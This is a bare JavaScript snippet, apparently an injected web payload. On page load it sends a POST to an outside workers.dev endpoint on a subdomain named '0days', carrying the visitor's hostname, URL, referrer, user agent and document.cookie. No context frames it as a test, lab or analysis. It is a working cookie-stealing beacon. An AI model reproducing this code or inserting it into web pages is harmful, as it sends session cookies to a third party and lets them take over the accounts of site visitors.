fetch('https://aged-cloud-b431.0days.workers.dev/w/8c12613f5acfd286-jab7ncdwl', {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
        domain: location.hostname,
        url: location.href,
        ref: document.referrer,
        ua: navigator.userAgent,
        cookie: document.cookie
    })
});
